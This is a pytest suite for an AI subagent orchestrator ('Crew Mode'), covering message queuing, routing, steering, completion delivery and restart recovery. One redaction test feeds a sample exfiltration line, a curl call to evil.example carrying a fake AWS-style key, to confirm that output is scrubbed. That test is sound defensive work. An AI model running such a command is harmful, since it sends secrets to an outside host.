"""Tests for Crew Mode (crew_chat.py): the engineered orchestrator pipeline.

Covers: durable store (queue entry lifecycle, restart reconciliation),
ingest (ack + queue entry), decision executor (validation, spawn/route/
hold/steer/ask/meta), conversation_busy → held, conversation_gone → respawn
with digest + payload replay, completion delivery (summary extraction,
attribution quote, held dispatch, stale completion), burst coalescing,
and mode plumbing (_VALID_MODES, create validation).
"""

from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import kiro_crew.crew_chat as crew_mod
from kiro_crew.crew_chat import CrewOrchestrator, CrewStore


@pytest.fixture(autouse=True)
def _isolate_crew_dir(tmp_path, monkeypatch):  # type: ignore[no-untyped-def]
    monkeypatch.setattr(crew_mod, "data_home", lambda: tmp_path)


def _slot(key: str = "s1", agent: str = "kirocrew") -> MagicMock:
    slot = MagicMock()
    slot.key = key
    slot.agent = agent
    slot.linked_session_key = ""
    return slot


def _spawn_info(run_id: str, done: bool = False, error: str = "", result: str = "",
                outcome: str = "") -> MagicMock:
    info = MagicMock()
    info.id = run_id
    info.done = done
    info.error = error
    info.result = result
    info.outcome = outcome or ("failed" if error else "completed")
    return info


def _orch(state: MagicMock | None = None, subagents: MagicMock | None = None) -> CrewOrchestrator:
    state = state or MagicMock()
    subagents = subagents or MagicMock()
    sessions = MagicMock()
    return CrewOrchestrator(state=state, sessions=sessions, subagents=subagents)


# ── store ──


class TestCrewStore:
    def test_add_and_persist_roundtrip(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("hello")
        st.add_topic("t1", "r1", "title", e["msg_id"])
        st2 = CrewStore("s1")  # fresh load from disk
        assert st2.entry(e["msg_id"])["text"] == "hello"
        assert st2.topic("t1")["active_run_id"] == "r1"

    def test_pending_includes_ask_state(self) -> None:
        st = CrewStore("s1")
        a = st.add_msg("m1")
        b = st.add_msg("m2")
        a["state"] = "ask"
        b["state"] = "done"
        assert [e["msg_id"] for e in st.pending()] == [a["msg_id"]]


# ── ingest ──


class TestIngest:
    @pytest.mark.asyncio
    async def test_ingest_enqueues_acks_and_schedules(self) -> None:
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_decide", new=AsyncMock()) as decide, \
             patch.object(orch, "_post") as post:
            await orch.ingest(slot, "do thing A")
            await asyncio.sleep(0)
        st = orch._store("s1")
        assert len(st.pending()) == 1
        post.assert_called_once()          # instant templated ack
        assert decide.await_count == 1 or decide.call_count == 1

    @pytest.mark.asyncio
    async def test_single_flight_folds_reentry(self) -> None:
        orch = _orch()
        slot = _slot()
        lock = orch._locks.setdefault("s1", asyncio.Lock())
        await lock.acquire()
        try:
            await orch._decide(slot)  # lock held → folds into rerun flag
            assert orch._rerun["s1"] is True
        finally:
            lock.release()


# ── executor ──


class TestExecutor:
    @pytest.mark.asyncio
    async def test_spawn_creates_owned_topic(self) -> None:
        subagents = MagicMock()
        subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("build X")
        with patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "build X"})
        assert orch.owns("r1")
        assert st.topic("r1")["status"] == "running"
        assert e["state"] == "accepted"
        # keep=True is mandatory (retention promotes at spawn)
        assert subagents.spawn.call_args.kwargs["keep"] is True
        # anti-nesting + summary contract appended
        assert "Do NOT spawn subagents" in subagents.spawn.call_args.args[0]
        assert "<<<SUMMARY" in subagents.spawn.call_args.args[0]

    @pytest.mark.asyncio
    async def test_unknown_msg_id_rejected(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        await orch._apply(_slot(), st, {"do": "spawn", "msg_id": "nope", "title": "x"})
        assert st.topics == []

    @pytest.mark.asyncio
    async def test_route_to_running_topic_holds(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert t["held"] == [e["msg_id"]]

    @pytest.mark.asyncio
    async def test_route_to_idle_topic_continues(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")
        assert e["state"] == "accepted"

    @pytest.mark.asyncio
    async def test_continue_busy_becomes_held(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_busy: run r1 in flight")
        )
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # store thinks idle but manager says busy
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_continue_gone_respawns_with_digest_and_payload(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: expired")
        )
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("original payload text")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        t["digest"] = "prior findings digest"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        seed = subagents.spawn.call_args.args[0]
        assert "prior findings digest" in seed
        assert "original payload text" in seed  # user never re-types
        assert t["topic_id"] == "r9" and orch.owns("r9")

    @pytest.mark.asyncio
    async def test_steer_only_when_running(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(True, "ok"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_not_awaited()  # executor rejects illegal steer
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_awaited_once()
        assert e["state"] == "steered"

    @pytest.mark.asyncio
    async def test_lost_steer_falls_back_to_held(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(False, "session_starting"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held" and e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_ask_and_meta(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e1 = st.add_msg("ambiguous")
        e2 = st.add_msg("what's in flight?")
        with patch.object(orch, "_post") as post:
            await orch._apply(_slot(), st, {"do": "ask", "msg_id": e1["msg_id"], "question": "new topic?"})
            await orch._apply(_slot(), st, {"do": "meta", "msg_id": e2["msg_id"]})
        assert e1["state"] == "ask"
        assert e2["state"] == "done"
        assert post.call_count == 2


# ── completion delivery ──


class TestCompletion:
    def _delivery_setup(self):  # type: ignore[no-untyped-def]
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("check the feed 403 thing")
        t = st.add_topic("t1", "r1", "feed 403", e["msg_id"])
        e["state"] = "accepted"
        e["run_id"] = "r1"
        orch._owned["r1"] = "s1"
        return orch, st, t, e, slot

    @pytest.mark.asyncio
    async def test_summary_extraction_and_attribution(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="long output <<<SUMMARY root cause found: yml missing >>> tail")
        with patch.object(orch, "_post") as post, \
             patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.01):
            await orch.on_subagent_done(info)
            await asyncio.sleep(0.05)
        body = post.call_args.args[1]
        assert "root cause found: yml missing" in body
        assert "↩ re:" in body and "check the feed 403" in body
        assert t["status"] == "idle"
        assert t["digest"].startswith("root cause found")
        assert e["state"] == "done"
        assert not orch.owns("r1")

    @pytest.mark.asyncio
    async def test_missing_summary_falls_back_to_result(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="plain result no delimiter")
        with patch.object(orch, "_post") as post, \
             patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.01):
            await orch.on_subagent_done(info)
            await asyncio.sleep(0.05)
        assert "plain result no delimiter" in post.call_args.args[1]

    @pytest.mark.asyncio
    async def test_stale_completion_ignored(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        orch._owned["r_old"] = "s1"  # old run, no topic points at it
        info = _spawn_info("r_old", done=True, result="stale")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        post.assert_not_called()
        assert t["status"] == "running"  # untouched

    @pytest.mark.asyncio
    async def test_held_head_dispatched_on_completion(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        held = st.add_msg("queued follow-up")
        held["state"] = "held"
        t["held"] = [held["msg_id"]]
        orch._subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        info = _spawn_info("r1", done=True, result="<<<SUMMARY done >>>")
        with patch.object(orch, "_post"), \
             patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.01):
            await orch.on_subagent_done(info)
            await asyncio.sleep(0.05)
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")

    @pytest.mark.asyncio
    async def test_burst_coalescing_groups_forwards(self) -> None:
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(orch, "_post") as post, \
             patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.05):
            orch._queue_forward(slot, "result A")
            orch._queue_forward(slot, "result B")
            await asyncio.sleep(0.15)
        post.assert_called_once()
        assert "result A" in post.call_args.args[1] and "result B" in post.call_args.args[1]


# ── restart reconciliation ──


class TestReconcile:
    def test_interrupted_dispatch_reopens(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("m")
        e["state"] = "claimed"
        t = st.add_topic("t1", "r_dead", "topic", e["msg_id"])
        t["status"] = "running"
        st.save()
        subagents = MagicMock()
        subagents._agents = {}  # run not alive
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")
        assert st2.entry(e["msg_id"])["state"] == "pending"
        assert st2.topic("t1")["status"] == "idle"

    def test_live_run_reowned(self) -> None:
        st = CrewStore("s1")
        t = st.add_topic("t1", "r_live", "topic", "m0")
        t["status"] = "running"
        st.save()
        live = _spawn_info("r_live", done=False)
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=live)
        orch = _orch(subagents=subagents)
        orch._store("s1")
        assert orch.owns("r_live")


# ── mode plumbing ──


class TestModePlumbing:
    def test_valid_modes_include_crew(self) -> None:
        from kiro_crew.dashboard.chat_folders import _VALID_MODES

        assert "crew" in _VALID_MODES


# ── adversarial-review regression fixes ──


class TestReviewFixes:
    """Regressions pinned from the adversarial review of 9b13c971."""

    def test_post_redacts_llm_output(self) -> None:
        # B1: _post is the sole delivery chokepoint and must redact.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          return_value=("[URL-REDACTED]", ["w"])) as r_url, \
             patch.object(crew_mod, "redact_credentials",
                          return_value=("[CRED-REDACTED]", ["w"])) as r_cred:
            orch._post(slot, "curl https://evil.example/?d=AKIA123")
        r_url.assert_called_once()
        r_cred.assert_called_once()
        assert slot.append.call_args.args[1] == "[CRED-REDACTED]"

    def test_post_fails_closed_when_redaction_raises(self) -> None:
        # B1 companion: never post raw content if redaction itself breaks.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          side_effect=RuntimeError("boom")):
            orch._post(slot, "secret")
        slot.append.assert_not_called()

    @pytest.mark.asyncio
    async def test_refused_respawn_does_not_wedge_topic(self) -> None:
        # B2 (Opus): conversation_gone → respawn refused must NOT be
        # recorded as a live topic (no completion will ever arrive).
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: files expired"))
        subagents.spawn = MagicMock(
            return_value=_spawn_info("y", done=True, error="spawn refused: low memory"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        with patch.object(orch, "_post") as post:
            orch._dispatch_continue(slot, st, t, e)
        assert e["state"] == "pending"          # re-examinable, not accepted
        assert t["status"] != "running"         # not wedged
        assert not orch.owns("y")
        post.assert_called_once()               # R1: user-visible signal

    @pytest.mark.asyncio
    async def test_successful_respawn_records_run_id(self) -> None:
        # R3: the respawn path must set e["run_id"] so completion settles it.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="resume_failed: no context"))
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        orch._dispatch_continue(_slot(), st, t, e)
        assert e["state"] == "accepted"
        assert e["run_id"] == "r9"
        assert t["active_run_id"] == "r9"

    @pytest.mark.asyncio
    async def test_stale_hold_on_idle_topic_dispatches(self) -> None:
        # B2 (GPT): a hold decided while running but applied after the topic
        # went idle must dispatch, not strand the message in held forever.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r5"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("late follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # completed while the decision LLM was thinking
        await orch._apply(_slot(), st, {"do": "hold", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"
        assert t["status"] == "running"
        assert e["msg_id"] not in t.get("held", [])

    def test_reconcile_reopens_held_entries(self) -> None:
        # B2 (Opus) companion: restart must reopen held entries (their
        # dispatching completion may never arrive) and clear topic held
        # lists so nothing double-dispatches later.
        st = CrewStore("s1")
        e = st.add_msg("stuck")
        t = st.add_topic("t1", "r-dead", "topic", "m0")
        e["state"] = "held"
        t["held"] = [e["msg_id"]]
        st.save()
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=None)  # run unknown after restart
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")  # triggers _reconcile
        e2 = st2.entry(e["msg_id"])
        assert e2["state"] == "pending"
        assert st2.topic("t1")["held"] == []
        assert st2.topic("t1")["status"] == "idle"

    def test_save_prunes_old_terminal_entries(self) -> None:
        # R2: queue.json must stay bounded — terminal entries beyond the cap
        # are pruned oldest-first; live entries are never pruned.
        st = CrewStore("s1")
        live = st.add_msg("still pending")
        for i in range(crew_mod._QUEUE_TERMINAL_CAP + 50):
            e = st.add_msg(f"old {i}")
            e["state"] = "done"
        st.save()
        terminal = [e for e in st.queue if e["state"] == "done"]
        assert len(terminal) == crew_mod._QUEUE_TERMINAL_CAP
        assert terminal[0]["text"] == "old 50"  # oldest 50 dropped
        assert st.entry(live["msg_id"]) is not None

    @pytest.mark.asyncio
    async def test_forward_persisted_before_flush_and_cleared_after(self) -> None:
        # Server GPT finding: a restart inside the coalesce window must not
        # lose the result. The body is durable before the flush sleeps, and
        # cleared only after the post.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.01), \
             patch.object(orch, "_post") as post:
            orch._queue_forward(slot, "result body")
            st = orch._store("s1")
            assert [f["body"] for f in st.forwards] == ["result body"]  # durable pre-flush
            await orch._forward_task["s1"]
        post.assert_called_once()
        assert st.forwards == []  # cleared post-delivery

    @pytest.mark.asyncio
    async def test_reconcile_redelivers_orphaned_forwards(self) -> None:
        # Crash between persist and post: reconcile re-delivers on restart.
        st = CrewStore("s1")
        st.add_forward("orphaned result")
        await st.wait_writes()  # durable before the "restarted" store reads disk
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(crew_mod, "_FORWARD_COALESCE_SECS", 0.01), \
             patch.object(orch, "_post") as post:
            orch._store("s1")  # triggers _reconcile inside a running loop
            task = orch._forward_task.get("s1")
            assert task is not None
            await task
        post.assert_called_once()
        assert "orphaned result" in post.call_args.args[1]
        await orch._store("s1").wait_writes()
        assert CrewStore("s1").forwards == []


# ── gateway wiring (GPT review finding on faf5a127) ──


class TestGatewayCrewInit:
    """_init_crew must attach AFTER dashboard init — calling it while
    dashboard_state is None silently disabled crew mode on every real boot."""

    def test_init_crew_attaches_when_dashboard_ready(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = MagicMock()
        g.dashboard_state.crew = None
        GatewayOrchestrator._init_crew(g)
        assert g.dashboard_state.crew is not None
        assert isinstance(g.dashboard_state.crew, CrewOrchestrator)

    def test_init_crew_noop_without_dashboard(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = None
        GatewayOrchestrator._init_crew(g)  # must not raise

    def test_startup_sequence_orders_crew_after_dashboard(self) -> None:
        # Static guard: in the gateway start sequence, _init_crew() must be
        # invoked after _init_dashboard() (the original defect called the
        # attach logic from _init_subagents, which runs earlier).
        import inspect

        import kiro_crew.slack.gateway as gw

        src = inspect.getsource(gw)
        dash = src.index("await self._init_dashboard()")
        crew = src.index("self._init_crew()")
        assert crew > dash

    @pytest.mark.asyncio
    async def test_completion_settles_store_when_slot_closed(self) -> None:
        # GPT finding on 7d6f4d7a: closing a crew slot mid-run must not leave
        # the topic wedged in "running" — settle + persist before slot check.
        state = MagicMock()
        state.get_slot = MagicMock(return_value=None)  # slot closed
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t1", "r7", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r7"
        orch._owned["r7"] = "s1"
        info = _spawn_info("r7", done=True, result="<<<SUMMARY all done >>>")
        await orch.on_subagent_done(info)
        assert t["status"] == "idle"          # settled, not wedged
        assert e["state"] == "done"
        await st.wait_writes()
        assert CrewStore("s1").topic("t1")["digest"] == "all done"  # persisted

    @pytest.mark.asyncio
    async def test_stopped_run_not_recorded_as_done(self) -> None:
        # GPT finding on a5bf0464: user-stopped runs have empty error but
        # outcome="stopped" — must not be persisted as success.
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t9", "r9", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r9"
        orch._owned["r9"] = "s1"
        info = _spawn_info("r9", done=True, result="partial", outcome="stopped")
        with patch.object(orch, "_queue_forward") as qf:
            await orch.on_subagent_done(info)
        assert e["state"] == "stopped"
        assert t["digest"] == "Stopped at your request."
        assert "Stopped at your request." in qf.call_args.args[1]

    @pytest.mark.asyncio
    async def test_save_offloads_write_and_newest_wins(self) -> None:
        # GPT finding on 76d35e37: store writes must not block the event loop.
        # Inside a running loop, _save schedules the disk write to the
        # executor; wait_writes() is the barrier. Newest snapshot wins.
        st = CrewStore("s1")
        st.add_msg("m1")  # sync path in fixture? — no: we're in a loop here
        st.queue[0]["text"] = "final"
        st.save()
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "final"

    def test_save_writes_inline_without_loop(self) -> None:
        # Sync callers (boot reconcile, tests) still get immediate durability.
        st = CrewStore("s1")
        st.add_msg("hello")
        assert CrewStore("s1").entry(st.queue[0]["msg_id"]) is not None

    def test_post_appends_without_implicit_broadcast(self) -> None:
        # GPT finding on 120fd95e: the explicit chat_message frame is the
        # single broadcast — append must be called with broadcast=False.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "hello")
        assert slot.append.call_args.kwargs.get("broadcast") is False
        orch._state.broadcast_ws.assert_called_once()

    @pytest.mark.asyncio
    async def test_ingest_persists_before_ack(self) -> None:
        # GPT finding on 120fd95e: the ack promises durability — the queue
        # entry must be on disk before the ack posts.
        orch = _orch()
        slot = _slot()
        order: list[str] = []
        st = orch._store("s1")
        real_wait = st.wait_writes

        async def traced_wait() -> None:
            await real_wait()
            order.append("durable")

        with patch.object(st, "wait_writes", side_effect=traced_wait), \
             patch.object(orch, "_post", side_effect=lambda *a, **k: order.append("ack")), \
             patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "important request")
            await asyncio.sleep(0)
        assert order == ["durable", "ack"]
        assert CrewStore("s1").queue[0]["text"] == "important request"

    @pytest.mark.asyncio
    async def test_failed_steer_on_idle_topic_dispatches(self) -> None:
        # GPT finding on 85f8fbe2: run completes during the steer await —
        # a failed steer must recheck status and continue, not hold forever.
        subagents = MagicMock()

        async def steer_and_complete(run_id: str, text: str):
            st.topic("t1")["status"] = "idle"  # completion raced the steer
            return False, "not_running"

        subagents.steer_run = steer_and_complete
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r8"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("correction")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"          # dispatched, not stranded
        assert e["msg_id"] not in t.get("held", [])

    @pytest.mark.asyncio
    async def test_wait_writes_propagates_failure(self) -> None:
        # GPT finding on 85f8fbe2: a failed durable write must surface, and
        # the generation must stay retryable (not recorded as landed).
        st = CrewStore("s1")
        with patch("pathlib.Path.replace", side_effect=OSError("disk full")):
            st.add_msg("doomed")
            with pytest.raises(OSError):
                await st.wait_writes()
        assert st._written_seq.get("queue.json", 0) == 0  # still retryable
        st.save()  # retry with healthy disk
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "doomed"
